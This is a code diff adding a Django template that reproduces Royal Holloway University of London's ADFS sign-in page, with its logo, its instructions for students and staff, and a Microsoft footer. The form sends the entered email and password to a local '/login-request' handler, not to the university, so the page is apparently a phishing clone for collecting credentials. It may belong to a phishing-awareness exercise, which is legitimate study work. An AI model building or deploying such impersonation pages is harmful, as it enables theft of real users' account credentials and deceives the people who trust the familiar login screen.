@@ -1,0 +1,246 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en-GB">
+    <head>
+        <title>Sign In</title>
+        <link rel="stylesheet" type="text/css" href='{% static 'style.css' %}' />
+        <style>.illustrationClass {background-image:url(/static/illustration.jpg);}</style>
+
+    </head>
+
+    <body dir="ltr" class="body">
+        <div id="fullPage">
+            <div id="brandingWrapper" class="float">
+                <div id="branding"></div>
+            </div>
+            <div id="contentWrapper" class="float">
+                <div id="content">
+                    <div id="header">
+                        <img class='logoImage' id='companyLogo' src='{% static 'logo.png' %}' alt='Royal Holloway University of London'/>
+                    </div>
+                    <div id="workArea">
+
+                        <div id="authArea" class="groupMargin">
+
+                            <div id="loginArea">
+                                <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
+{#https://adfs.rhul.ac.uk/adfs/ls/?client-request-id=865edea9-dca6-4468-cf28-0080000000b1#}
+{#                                <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="/login-request" >#}
+                                <form method="post" id="loginForm" autocapitalize="off" novalidate="novalidate" action="/login-request">
+                                    {% csrf_token %}
+                                    <div id="error" class="fieldMargin error smallText">
+                                        <span id="errorText" for=""></span>
+                                    </div>
+                                    <div id="formsAuthenticationArea">
+                                        <div id="userNameArea">
+                                            <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
+                                            <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth"
+                                                spellcheck="false" placeholder="someone@example.com" autocomplete="off"/>
+                                        </div>
+
+                                        <div id="passwordArea">
+                                            <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+                                            <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth"
+                                                placeholder="Password" autocomplete="off"/>
+                                        </div>
+                                        <div id="kmsiArea" style="display:none">
+                                            <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
+                                            <label for="kmsiInput">Keep me signed in</label>
+                                        </div>
+                                        <div id="submissionArea" class="submitMargin">
+                                            <input type="submit" class="submit" tabindex="4" role="button">
+
+
+{#                                            <span id="submitButton" class="submit" tabindex="4" role="button"#}
+{#                                                onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"#}
+{#                                                onclick="return Login.submitLoginRequest();">Sign in#}
+{#                                            </span>#}
+                                        </div>
+                                    </div>
+                                    <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
+                                </form>
+
+                                <div id="introduction" class="groupMargin">
+                                    <p><strong>Students:</strong>&nbsp;Please sign in using the format abcd123@live.rhul.ac.uk.<br/>
+                                    <strong>Staff:</strong>&nbsp;Please sign in using your Royal Holloway email address.<br/><strong>Alumni:</strong>&nbsp;Please visit <A href='https://intranet.royalholloway.ac.uk/students/help-support/it-services/alumni-email-accounts.aspx'>this page</a> to find out how to access your account.<br/>
+                                    If you experience problems signing in, please <a href='https://intranet.royalholloway.ac.uk/staff/it-services/get-help-with-it/home.aspx'>contact the IT Service Desk</a>.<br/>
+                                    <br/>
+                                    <strong>Note:</strong>&nbsp;Due to infrastructure changes undertaken earlier this month, you may not be able to see older emails and calendar items. Your mailbox content will be fully restored by 20 July 2020.</p>
+                                </div>
+
+                                <script type="text/javascript">
+                                //<![CDATA[
+
+                                    function Login() {
+                                    }
+
+                                    Login.userNameInput = 'userNameInput';
+                                    Login.passwordInput = 'passwordInput';
+
+                                    Login.initialize = function () {
+
+                                        var u = new InputUtil();
+
+                                        u.checkError();
+                                        u.setInitialFocus(Login.userNameInput);
+                                        u.setInitialFocus(Login.passwordInput);
+                                    }();
+
+                                    Login.submitLoginRequest = function () {
+                                        var u = new InputUtil();
+                                        var e = new LoginErrors();
+
+                                        var userName = document.getElementById(Login.userNameInput);
+                                        var password = document.getElementById(Login.passwordInput);
+
+                                        if (!userName.value || !userName.value.match('[@\\\\]')) {
+                                            u.setError(userName, e.userNameFormatError);
+                                            return false;
+                                        }
+
+                                        if (!password.value) {
+                                            u.setError(password, e.passwordEmpty);
+                                            return false;
+                                        }
+
+                                        if (password.value.length > maxPasswordLength) {
+                                            u.setError(password, e.passwordTooLong);
+                                            return false;
+                                        }
+
+                                        document.forms['loginForm'].submit();
+                                        return false;
+                                    };
+
+                                    InputUtil.makePlaceholder(Login.userNameInput);
+                                    InputUtil.makePlaceholder(Login.passwordInput);
+                                //]]>
+                                </script>
+                            </div>
+
+                         </div>
+
+                    </div>
+                    <div id="footerPlaceholder"></div>
+                </div>
+                <div id="footer">
+                    <div id="footerLinks" class="floatReverse">
+                         <div>
+                             <span id="copyright">&#169; 2016 Microsoft</span>
+                         </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script type='text/javascript'>
+            if (navigator.userAgent.match(/iPhone/i) != null) {
+                var emails = document.querySelectorAll("input[type='email']");
+                if (emails) {
+                    for (var i = 0; i < emails.length; i++) {
+                        emails[i].type = 'text';
+                    }
+                }
+            }
+
+            // In the CSS file we set the ms-viewport to be consistent with the device dimensions,
+            // which is necessary for correct functionality of immersive IE.
+            // However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
+            // values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
+            // Windows 8 phone has agent string 'IEMobile 10.0'
+            if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+                var msViewportStyle = document.createElement("style");
+                msViewportStyle.appendChild(
+                    document.createTextNode(
+                        "@-ms-viewport{width:auto!important}"
+                    )
+                );
+                msViewportStyle.appendChild(
+                    document.createTextNode(
+                        "@-ms-viewport{height:auto!important}"
+                    )
+                );
+                document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+            }
+
+            // If the innerWidth is defined, use it as the viewport width.
+            if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
+                var viewport = document.querySelector("meta[name=viewport]");
+                viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, user-scalable=1');
+            }
+
+            // Gets the current style of a specific property for a specific element.
+            function getStyle(element, styleProp) {
+                var propStyle = null;
+
+                if (element && element.currentStyle) {
+                    propStyle = element.currentStyle[styleProp];
+                }
+                else if (element && window.getComputedStyle) {
+                    propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
+                }
+
+                return propStyle;
+            }
+
+            // The script below is used for downloading the illustration image
+            // only when the branding is displaying. This script work together
+            // with the code in PageBase.cs that sets the html inline style
+            // containing the class 'illustrationClass' with the background image.
+            var computeLoadIllustration = function () {
+                var branding = document.getElementById("branding");
+                var brandingDisplay = getStyle(branding, "display");
+                var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
+
+                if (brandingDisplay && brandingDisplay !== "none" &&
+                    brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
+                    var newClass = "illustrationClass";
+
+                    if (branding.classList && branding.classList.add) {
+                        branding.classList.add(newClass);
+                    } else if (branding.className !== undefined) {
+                        branding.className += " " + newClass;
+                    }
+                    if (window.removeEventListener) {
+                        window.removeEventListener('load', computeLoadIllustration, false);
+                        window.removeEventListener('resize', computeLoadIllustration, false);
+                    }
+                    else if (window.detachEvent) {
+                        window.detachEvent('onload', computeLoadIllustration);
+                        window.detachEvent('onresize', computeLoadIllustration);
+                    }
+                }
+            };
+
+            if (window.addEventListener) {
+                window.addEventListener('resize', computeLoadIllustration, false);
+                window.addEventListener('load', computeLoadIllustration, false);
+            }
+            else if (window.attachEvent) {
+                window.attachEvent('onresize', computeLoadIllustration);
+                window.attachEvent('onload', computeLoadIllustration);
+            }
+
+            // Function to change illustration image. Usage example below.
+            function SetIllustrationImage(imageUri) {
+                var illustrationImageClass = '.illustrationClass {background-image:url(' + imageUri + ');}';
+
+                var css = document.createElement('style');
+                css.type = 'text/css';
+
+                if (css.styleSheet) css.styleSheet.cssText = illustrationImageClass;
+                else css.appendChild(document.createTextNode(illustrationImageClass));
+
+                document.getElementsByTagName("head")[0].appendChild(css);
+            }
+
+            // Example to change illustration image on HRD page after adding the image to active theme:
+            // PSH> Set-AdfsWebTheme -TargetName <activeTheme> -AdditionalFileResource @{uri='/adfs/portal/images/hrd.jpg';path='.\hrd.jpg'}
+            //
+            //if (typeof HRD != 'undefined') {
+            //    SetIllustrationImage('/adfs/portal/images/hrd.jpg');
+            //}
+            //]]>
+        </script>
+    </body>
+</html>
+
